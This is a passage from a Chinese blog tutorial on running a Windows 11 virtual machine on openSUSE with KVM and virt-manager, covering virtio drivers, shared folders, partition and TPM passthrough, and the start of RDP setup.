href="https://www.wps.com/">WPS</a>，技术水平暂且不谈,当笔者在自家老母亲的旧电脑上打开这软件后跳出一堆各种花花绿绿的广告铺满屏幕然后让电脑变得特别特别卡的时候笔者就决定<strong>哪怕再多花点钱多买几套正版的 Office 也不会再考虑这一款国产软件</strong></p><blockquote><p>当然，除了这个问题以外，WPS 还存在<a href="https://www.zhihu.com/question/542676012">数据安全问题</a>，那这是否就有点…</p></blockquote></blockquote><h3 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h3><p>在这个 QQ 都转向 NTQQ 的 4202 年微信还是迟迟不出 Linux 版就令人很难评了<del>这就不得不提某人的含马量了（）</del>，使用 wine 来运行 WeChat 勉强算是一个可行的策略，但是强行用 wine 跑起来的微信只能说是勉强能用，各种功能缺失以及不完整再加上 wine 的功能不完善带来的令人难以直视的各种边框更是让人想要毁灭世界，而功能本就缺失的网页版微信也慢慢变得不再可用，想要在 openSUSE 上完美使用微信似乎已经变成了一种奢求</p><p><img src="https://s2.loli.net/2024/02/23/FoyxtmMUnrJzel9.png" alt="有没有深圳上单能去猎一下某人的🐎.jpg"></p><p>海外的办公软件如 Slack 和 Discord （这个大概勉强也能算办公软件）倒是有原生 Linux 版，What’s App 有网页版但是笔者倒是没有用过，Teams 则只有网页版可用</p><blockquote><p>飞书以及其海外版 Lark 却是都有非常好用的原生 Linux 版， <del>那这里👴就不得不夸一夸👴的前东家国际化大企业字节跳动的含金量了</del> </p><p>至于像钉钉这样的软件似乎也是有 Linux 版，不过笔者基本用不到这个软件所以暂且就不进行深入了解了</p></blockquote><h3 id="游戏及各类其它问题"><a href="#游戏及各类其它问题" class="headerlink" title="游戏及各类其它问题"></a>游戏及各类其它问题</h3><p>这里就不展开说了，因为前面已经讲了这么多废话了，同时笔者也懒得再打字了，总而言之 Linux 除了与计算机专业直接强相关的东西以外似乎都没有比较完美的原生解决方案，这令笔者十分苦恼 ：(</p><h2 id="How-to-解决？"><a href="#How-to-解决？" class="headerlink" title="How to 解决？"></a>How to 解决？</h2><p>让我们重新回顾《虚拟化导论》中的一个基本概念：<code>只要我们能够通过某种方式向上层提供表现相同的抽象接口，在上层看来我们就是正常的该层所提供的资源，从而就实现了对该层的虚拟化</code> ；因此对于 <code>想要在 Linux 下运行 Windows 独占的软件</code> 这个需求而言，我们只需要提供一个相应的兼容层便能运行——<a href="https://www.winehq.org/">wine</a> 便是这样一个软件，其通过提供相应的 Windows 执行环境（如重新实现各种 DLL）来实现，虽然说目前已经能够流畅地运行很多原生 Windows 软件，但是要把整个 Windows 都给重新实现一遍的工作量相当巨大，至少就目前而言还是缺少相当多的各种不同的运行库，难以真正地在 *NIX 系统上完美无缝运行 Windows 下的二进制程序</p><p><img src="https://s2.loli.net/2024/02/23/6asVIrGX1WygDmq.png" alt="网易云其实原本是有 Linux 原生的，可惜前几年终止开发了"></p><p>重新再看虚拟化层次的划分，Wine 是通过实现了 API 抽象层来完成 Windows 各种运行库的虚拟化，那么再往下一层呢——若是我们能够实现硬件抽象层，我们便能完成操作系统级的虚拟化，这样我们自然便有了一个对应操作系统的完整运行环境——即通过<strong>虚拟机</strong>（Virtual Machine）来运行一个完整的 Windows 系统，这样<strong>我们便能完美运行原生的 Windows 程序</strong> ，若是之后我们再将一些必要的设备给 passthrough 进 Windows 中（或是纯模拟也行）、建立好完善的共享文件夹等机制，我们便能舒适地将 Windows 虚拟机融入到我们的 Linux 物理机当中：）</p><blockquote><p>当然，虚拟机的性能损耗肯定是有的，但很多情况下这些性能损耗其实无所谓 ：）</p></blockquote><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png"></p><p>因此本篇文章将教大家如何在 Linux 上优雅地食用 Windows 虚拟机</p><blockquote><p>——好吧， <em>运行一个 Windows 虚拟机来跑 Windows 程序这件事似乎是没有任何的新意</em> ，<strong>但若是我们能够通过 RDP 连接直接映射不同的程序窗口而非整个桌面呢？</strong> ——<code>远程桌面协议</code>（Remote Desktop Protocol）让通过网络的远程计算机桌面图像传输与鼠标键盘事件传输成为了可能，同时 xfreerdp 支持仅传输单个应用窗口，由此<strong>我们就能达成在 Linux 桌面中近乎完美地原生运行 Windows 程序的效果</strong></p><p><img src="https://s2.loli.net/2024/02/21/uqlDdERXCQpo3Z7.png" alt="image.png"></p><p>不过由于各种问题，<strong>目前这种办法依然存在较大的 bug，没办法足够舒适地运行</strong>，目前而言只能继续期待后人的努力：）</p></blockquote><h1 id="0x01-通过-Virt-Manager-KVM-运行一个-Windows-虚拟机"><a href="#0x01-通过-Virt-Manager-KVM-运行一个-Windows-虚拟机" class="headerlink" title="0x01. 通过 Virt-Manager + KVM 运行一个 Windows 虚拟机"></a>0x01. 通过 Virt-Manager + KVM 运行一个 Windows 虚拟机</h1><h2 id="安装虚拟化相关组件"><a href="#安装虚拟化相关组件" class="headerlink" title="安装虚拟化相关组件"></a>安装虚拟化相关组件</h2><blockquote><p>参考 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/index.html">openSUSE - Virtualization Guide</a> 和 <a href="https://zh.opensuse.org/KVM">openSUSE wiki - KVM</a> 以及 <a href="https://documentation.suse.com/zh-cn/sles/15-SP4/html/SLES-all/cha-kvm-intro.html"> SUSE Linux Enterprise Server 文档 - 虚拟化指南</a></p></blockquote><p>首先检查自己的 CPU 是否支持硬件虚拟化（<del>不过这个年代应该没有不支持硬件虚拟化的 CPU 了吧</del>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo LC_ALL=C lscpu | grep Virtualization</span><br></code></pre></td></tr></table></figure><blockquote><p>如果没有结果的话重启进 BIOS&#x2F;UEFI 里开一下，有些机型默认不会开启 CPU 虚拟化，<del>若是真的不支持硬件虚拟化那笔者还是建议你赶紧换一台电脑，或者至少换个 U 吧，都什么年代还在用传统电脑</del></p></blockquote><p>然后安装 libvirt,一个非常舒适的虚拟机管理库，这里直接用 YaST 来安会非常方便：</p><p><img src="https://s2.loli.net/2024/02/21/MeTP9qdfWFSRG6g.png" alt="这就是我们 SUSE 的 YaST 啊，你们有没有这样的 YaST 啊，真是 YY 又 aa、SS 又 TT 啊.jpg"></p><blockquote><p>这里笔者安完才发现忘了勾上 <code>KVM server</code> 了，但是再打开发现按钮灰了没办法补勾上…..不过也无所谓了反正看这篇文章的小伙伴记得勾上就好 ：）</p></blockquote><p>然后安装 virt-manager 和 libvirt-daemon：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> virt-manager libvirt-daemon</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> libvirtd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl start libvirtd</span><br></code></pre></td></tr></table></figure><blockquote><p>QEMU 的话因为要做 kernel pwn 的缘故笔者很早就安装上了所以安装步骤这里就略过了，这里大家就自己想办法安吧（笑</p></blockquote><p>在 <code>.bash_profile</code> 里导入这个变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LIBVIRT_DEFAULT_URI=qemu:///system<br></code></pre></td></tr></table></figure><p>把自己加相应的组里再重启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -a -G libvirt $(<span class="hljs-built_in">whoami</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -a -G kvm $(<span class="hljs-built_in">whoami</span>)</span><br></code></pre></td></tr></table></figure><p>配置 default 网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-define /usr/share/libvirt/networks/default.xml</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-autostart default</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-start default</span><br></code></pre></td></tr></table></figure><blockquote><p>注：libvirt 默认的 NAT 网络<strong>似乎有些小问题</strong> （参见 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/cha-libvirt-host.html">openSUSE doc</a>），如果你没法联网那笔者还是建议使用桥接模式</p></blockquote><h2 id="安装-Windows-虚拟机"><a href="#安装-Windows-虚拟机" class="headerlink" title="安装 Windows 虚拟机"></a>安装 Windows 虚拟机</h2><p>首先在 virt-manager 里 enable 上 xml 编辑：</p><p><img src="https://s2.loli.net/2024/02/22/ZgwYWakbBunNDTR.png" alt="image.png"></p><p>然后下载 <a href="https://www.microsoft.com/software-download/windows11">Windows ISO</a> 和 <a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso">KVM virtio Drivers</a></p><p>之后在 virt-manager 里创建一个虚拟机，创建过程中别忘了勾上 <code>Customize configuration before install</code> ，完成基本配置后挂上第二个 ISO：</p><p><img src="https://s2.loli.net/2024/02/22/BrWcYaihNm83lu9.png" alt="image.png"></p><p>然后在 CPU 的 XML 里编辑 <code>clock</code> ，<strong>修改为如下配置</strong> ,这样可以减少待机开销：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">clock</span> <span class="hljs-attr">offset</span>=<span class="hljs-string">&#x27;localtime&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">timer</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hpet&#x27;</span> <span class="hljs-attr">present</span>=<span class="hljs-string">&#x27;yes&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">timer</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hypervclock&#x27;</span> <span class="hljs-attr">present</span>=<span class="hljs-string">&#x27;yes&#x27;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">clock</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启用 <code>shared memory</code> ：</p><p><img src="https://s2.loli.net/2024/02/22/lgUtwfdYejPDprI.png"></p><p>其他的比如说：</p><ul><li>virt-manager 里该 VM 名字改为 <code>RDPWindows</code></li><li>配置自启动</li><li>硬盘类型改为 virtio</li><li>网卡模型改为 virtio（可选）</li></ul><p>之类的过程笔者这里就略过了，网上资料一大把：）</p><p>接下来 <code>Begin Installation</code> 然后就是：Windows，启动————</p><blockquote><p>忘了截开始界面了，无所谓了</p></blockquote><p>我们的硬盘是 virtio 的，所以首先是 <code>加载驱动程序</code>：</p><p><img src="https://s2.loli.net/2024/02/22/iKncHYCWN3XwAkU.png"></p><p>Windows 安装程序会自动扫到我们的 virtio 驱动的 CD，直接选对应版本：</p><p><img src="https://s2.loli.net/2024/02/22/7JUZdRSg68VINnk.png"></p><p>Windows 11 默认没有网不给安装非常 sb，不过 <code>shift + F10</code> 唤出 cmd 输入 <code>OOBE\BYPASSNRO</code> 重新开始就能绕过了：</p><p><img src="https://s2.loli.net/2024/02/22/pOfl2IcSr9YbxtC.png"></p><p>进系统以后找到我们的 virtio 驱动光碟，运行 <code>virtio-win-gt-x64.msi</code> 和 <code>virtio-win-guest-tools.exe</code> 安驱动（全选就行），然后就有网了：</p><p><img src="https://s2.loli.net/2024/02/22/AIfG5mivr6zN9yu.png"></p><p>然后开浏览器把 <a href="https://github.com/Fmstrat/winapps/blob/main/install/RDPApps.reg">https://github.com/Fmstrat/winapps/blob/main/install/RDPApps.reg</a> 下载到本地并右键 <code>合并</code> ：</p><p><img src="https://s2.loli.net/2024/02/22/Ilq7dp9ocfCzFTm.png"></p><p>然后进设置里开远程桌面就行：</p><p><img src="https://s2.loli.net/2024/02/22/yWUONuJ5z9CX2hg.png"></p><h2 id="配置-Guest-与-Host-间的数据共享"><a href="#配置-Guest-与-Host-间的数据共享" class="headerlink" title="配置 Guest 与 Host 间的数据共享"></a>配置 Guest 与 Host 间的数据共享</h2><p>为了方便直接通过 virt-manager 使用 VM，还可以进 VM 里安装 <a href="https://www.spice-space.org/download/windows/spice-guest-tools/spice-guest-tools-latest.exe">spice-guest-tools</a>，这样便能支持 Host 与 Guest 之间各种不管是文本还是图片的各种互相复制粘贴了</p><blockquote><p>如果剪贴板共享坏了，在 <code>服务</code> 里检查一下 <code>SPICE</code> 相关服务是不是挂了，如果经常挂的话建议配置为 <code>自动（延迟启动）</code></p></blockquote><p>对于 Host 与 Guest 之间的文件传输，使用 <code>共享文件夹</code> 似乎是一个不错的方法，将 VM 关机后进入设置中添加一个新的 <code>Filesystem</code> virtio 设备即可：</p><p><img src="https://s2.loli.net/2024/02/22/l9ASvEDfMkzyBUt.png"></p><p>接下来在 Guest VM 中安装 <a href="https://winfsp.dev/">WinFSP</a>（Windows File System Proxy），aka FUSE for Windows，用以挂载我们的共享文件夹</p><p><img src="https://s2.loli.net/2024/02/22/O8BhKgX5WY47tuR.png" alt="只安装 Core 其实也行"></p><p>前面我们已经安装过 virtio 驱动了，所以这里直接重启就行，打开设备管理器后我们便能看到一个 VirtIO FS 设备：</p><p><img src="https://s2.loli.net/2024/02/22/ksPrQjNEvtylWwA.png"></p><p>在 <code>服务</code> 中找到 <code>VirtIO-FS Service</code> 将其设为 <code>自动</code> ，<code>应用</code> 后点击 <code>启动</code>：</p><p><img src="https://s2.loli.net/2024/02/22/Pabrv2cozpUhKYu.png"></p><p>然后就 ok 了：</p><p><img src="https://s2.loli.net/2024/02/22/atYk9XEob2nf6h4.png"></p><blockquote><p>如果你在配置了共享文件夹后 VM 无法启动，且提示 <code>virtiofsd died unexpectedly</code> ，首先检查 <code>/var/log/libvirt/qemu/</code> 下的相关日志文件，若有类似 <code>libvirt:  error : cannot execute binary /usr/libexec/virtiofsd/virtiofsd: Permission denied</code> 这样的提示，则有可能是 <code>AppArmor</code> 的原因</p><p>解决方案是在 <code>/etc/apparmor.d/usr.sbin.libvirtd</code> 中适当的位置添加一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/&#123;lib,lib64,lib/qemu,libexec&#125;/virtiofsd/* PUx,<br></code></pre></td></tr></table></figure><p>之后 <code>sudo service apparmor restart</code> 重启 AppArmor，理论上此时便能正常启动了</p><p>若还是不行，则检查 <strong>libvirtd 服务是否存活</strong>，并进行重启</p></blockquote><blockquote><p>如果重启后你的 VM 无法连上网，可能是防火墙禁止了转发（通过 <code>iptables -A FORWARD -j ACCEPT</code> 命令启用转发），也可能是 libvirtd 莫名其妙挂了，<del>也可能是玄学问题多重启几遍就莫名其妙好了</del></p></blockquote><h2 id="Extra-同一物理磁盘分区直通-（not-so-recommend）"><a href="#Extra-同一物理磁盘分区直通-（not-so-recommend）" class="headerlink" title="_Extra. 同一物理磁盘分区直通_（not so recommend）"></a>_Extra. 同一物理磁盘分区直通_（not so recommend）</h2><blockquote><p>参考<a href="https://jianmin.dev/2020/jul/19/boot-your-windows-partition-from-linux-using-kvm/">这篇文章</a></p></blockquote><blockquote><p>注：如果你是在已有数据的分区上进行操作，<strong>请首先确保已经完成了数据备份</strong>！！！</p><p>注2：仅分区直通很容易把 Windows 干碎，然后出现各种问题，<strong>推荐大家还是买个双盘位电脑然后单独通一个盘给 Windows</strong></p></blockquote><p>虚拟机硬盘直通放在 4202 年自然已经不是一件稀奇的事情，但是通常的硬盘直通架构都是要将一整块物理硬盘通给单个虚拟机，若是你和笔者一样买了一部只有单盘位的笔记本（但是笔者的上一部笔记本有三盘位， <del>这次属于是经典考虑不周了</del> ），<strong>同时希望保留原有物理硬盘的 Windows 直接启动的能力</strong>，那么我们只能先预先分好区，之后再<strong>通过将分区建立为新的虚拟磁盘设备的方式</strong>将这部分分区作为一块新磁盘通给虚拟机</p><h3 id="创建-virtual-RAID-disk"><a href="#创建-virtual-RAID-disk" class="headerlink" title="创建 virtual RAID disk"></a>创建 virtual RAID disk</h3><p>首先载入点必要的驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe loop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe linear</span><br></code></pre></td></tr></table></figure><p>接下来创建三个文件作为 GPT 表、 EFI 分区、 GPT 元数据，并挂载为 loopback 设备：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=gpt bs=1M count=1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=efi1 bs=1M count=100</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=efi2 bs=1M count=1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f gpt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f efi1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f efi2</span><br></code></pre></td></tr></table></figure><p>此时用 <code>losetup -a</code> 应当能看到三个 loopback 设备：</p><p><img src="https://s2.loli.net/2024/02/26/yTtnwX52JzfZYFc.png"></p><p>打开 YaST2 Partitioner （或是其他你所熟悉的能够查看分区信息的工具比如说 <code>fdisk -l</code>），找到原本属于 Windows 的那几个分区<strong>当中的数据分区</strong>：</p><blockquote><p>注：如果你原本就没有已经装好了的 Windows 分区，直接在待用分区上创建一个新的逻辑卷给 Windows 用就行</p></blockquote><p><img src="https://s2.loli.net/2024/02/24/VWeF4iTcSs3qL9n.png" alt="需要注意的是，笔者在安装 Linux 时使用了新的 EFI 分区，而并非和 Windows 共用一个"></p><p>然后使用 madam （Multiple Disk and Device Administration）创建 RAID，以及注意不要把物理盘的 EFI 分区选进来了）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mdadm --build --verbose /dev/md0 --chunk=512 --level=linear --raid-devices=6 /dev/loop0 /dev/loop1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/nvme0n1p4 /dev/loop2</span><br></code></pre></td></tr></table></figure><p>然后进入 parted 进行分区，<strong>注意分区大小</strong>，注意 <code>mkpart</code>  子命令的格式为 <code>mkpart [part‐type name fs‐type] start end</code> ，<strong>注意自行计算分区起始位置</strong>：</p><blockquote><p>数据无价，谨慎操作！</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo parted /dev/md0</span><br>GNU Parted 3.6<br>Using /dev/md0<br>Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.<br>(parted) unit s                                                           <br>(parted) mktable gpt<br>(parted) mkpart primary fat32 2048 206847                                 <br>(parted) mkpart msr 206848 239615                                         <br>(parted) mkpart primary ntfs 239616 1677961215                            <br>(parted) mkpart primary ntfs 1677961216 -2049                             <br>(parted) set 1 boot on                                                    <br>(parted) set 1 esp on                                                <br>(parted) set 2 msftres on                                                 <br>(parted) set 3 msftdata on                                                <br>(parted) set 4 hidden on                                                  <br>(parted) set 4 diag on                                                    <br>(parted) name 1 EFI                                                       <br>(parted) name 3 Windows                                                   <br>(parted) quit                                                             <br>Information: You may need to update /etc/fstab.<br></code></pre></td></tr></table></figure><p>然后用 <code>mkfs.msdos</code> 格式化 EFI 分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.msdos -F 32 -n EFI /dev/md0p1</span><br></code></pre></td></tr></table></figure><p>接下来编辑虚拟机磁盘：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">disk</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;block&quot;</span> <span class="hljs-attr">device</span>=<span class="hljs-string">&quot;disk&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">driver</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;qemu&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;raw&quot;</span> <span class="hljs-attr">cache</span>=<span class="hljs-string">&quot;none&quot;</span> <span class="hljs-attr">io</span>=<span class="hljs-string">&quot;native&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">dev</span>=<span class="hljs-string">&quot;/dev/md0&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">dev</span>=<span class="hljs-string">&quot;vda&quot;</span> <span class="hljs-attr">bus</span>=<span class="hljs-string">&quot;virtio&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">boot</span> <span class="hljs-attr">order</span>=<span class="hljs-string">&quot;1&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">address</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;pci&quot;</span> <span class="hljs-attr">domain</span>=<span class="hljs-string">&quot;0x0000&quot;</span> <span class="hljs-attr">bus</span>=<span class="hljs-string">&quot;0x04&quot;</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;0x00&quot;</span> <span class="hljs-attr">function</span>=<span class="hljs-string">&quot;0x0&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">disk</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>然后重新把我们的 Windows 安装光碟与 virtio 驱动挂上去，放到第一个启动：</p><blockquote><p>注：你需要在启动时 <code>press any key</code> 才会从 CDROM 启动</p></blockquote><p><img src="https://s2.loli.net/2024/02/24/CKQAUWexdacbl3m.png"></p><p>重启后首先按惯例进入安装界面装载 virtio 驱动：</p><p><img src="https://s2.loli.net/2024/02/24/ekb9Qsd82oOc1Nf.png"></p><p>完成后 <code>shift + f10</code> 唤出 cmd，在 <code>diskpart</code> 中找到 EFI 分区，分配驱动号 <code>B</code>：</p><p><img src="https://s2.loli.net/2024/02/24/KOLZMNRl1o6iu3q.png"></p><p>最后通过如下命令将 virtio 驱动注入 C 盘，并在 EFI 分区中配置好启动项：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">dism /image:c:\ /add-driver /driver:e:\viostor\w11\amd64\viostor.inf<br>bcdboot C:\Windows /s B: /f ALL<br></code></pre></td></tr></table></figure><p>重启，重新进行账户验证，然后就是见证奇迹的时刻——</p><p><img src="https://s2.loli.net/2024/02/24/P4IqVFUflRMNtsa.png" alt="唉👴的桌面这么私密的空间都给大家看了.jpg"></p><h3 id="通过-libvirt-hook-配置-RAID-自创建与卸载"><a href="#通过-libvirt-hook-配置-RAID-自创建与卸载" class="headerlink" title="通过 libvirt hook 配置 RAID 自创建与卸载"></a>通过 libvirt hook 配置 RAID 自创建与卸载</h3><p>RAID 的配置不能持久化，因此需要我们写一个脚本来在每次启动 VM 前先检查是否创建了 RAID，若否，则先创建 RAID 再启动</p><p>这里我们可以通过创建 <code>/etc/libvirt/hooks/qemu</code> 脚本来实现 VM 启动前的 hook，在其中写入如下内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>VM_NAME=<span class="hljs-string">&quot;Windows11PhysVM&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> == <span class="hljs-variable">$VM_NAME</span> ]] &amp;&amp; [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> || <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;stopped&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>   <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>     <span class="hljs-comment"># startup logic here</span><br>     modprobe loop<br>     modprobe linear<br>     LOOP1=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP2&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/gpt<br>     LOOP2=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP2&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/efi1<br>     LOOP3=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP3&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/efi2<br>     mdadm --build --verbose /dev/md0 --chunk=512 --level=linear --raid-devices=6 /dev/loop0 /dev/loop1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/nvme0n1p4 /dev/loop2<br>   <span class="hljs-keyword">else</span><br>     <span class="hljs-comment"># shutdown logic here</span><br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Stopping array&quot;</span><br>     mdadm --stop /dev/md0<br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;removing loopback devices&quot;</span><br>     losetup | grep -i <span class="hljs-string">&quot;win11vm&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs sudo losetup -d<br>   <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h3 id="配置-TPM-直通"><a href="#配置-TPM-直通" class="headerlink" title="配置 TPM 直通"></a>配置 TPM 直通</h3><p><strong>可信平台模块</strong>（<a href="https://learn.microsoft.com/zh-cn/windows/security/hardware-security/tpm/trusted-platform-module-overview">Trusted Platform Module</a>）芯片是主板上的一块用来确保物理安全性的芯片，Windows 用其确保系统的物理安全性，包括 Pin 码等，自 Win 11 起 TPM 成为了操作系统启动的硬性要求</p><p>QEMU 虽然可以模拟 vTPM，但是与物理机 TPM 的非一致性会让系统在 Win 物理机与虚拟机间切换时造成一定的问题（在 Windows 看来这破坏了系统的完整性），由于在 Linux PC 上我们通常并不使用 TPM 特性，因此这里我们可以选择直接将 TPM 模块直通给虚拟机</p><p>TPM 模块的设备路径通常为 <code>/dev/tpm0</code> （v1.2）与 <code>/dev/tpmrm0</code> （v2.0），通常我们应当将前者进行直通才能达到完整直通的效果：</p><p><img src="https://s2.loli.net/2024/02/26/wnPzW97uJxqKXFI.png" alt="真是简简又单单，你们有没有这样的 virt-manager 啊">)</p><p>然后就能用 pin 登录了：</p><p><img src="https://s2.loli.net/2024/02/28/GFo179iyWNLetIX.png"></p><h3 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a><em>可能遇到的问题</em></h3><ul><li>Host 重启至 Windows 后 WLAN 适配器丢失：在网络适配器里卸载 Kernel Mode Debugger，然后在管理里选择无线网卡设备，<strong>卸载设备</strong>，扫描设备更改，然后右键桌面右下角网络图标打开 <code>诊断网络问题 </code>，启用 WLAN 适配器即可</li></ul><h1 id="0x02-在-Host-侧配置-RDP-连接"><a href="#0x02-在-Host-侧配置-RDP-连接" class="headerlink" title="0x02. 在 Host 侧配置 RDP 连接"></a>0x02. 在 Host 侧配置 RDP 连接</h1><h2 id="配置-RDP-硬体加速"><a href="#配置-RDP-硬体加速" class="headerlink" title="配置 RDP 硬体加速"></a>配置 RDP 硬体加速</h2><p>运行 <code>gpedit.msc</code> 找到 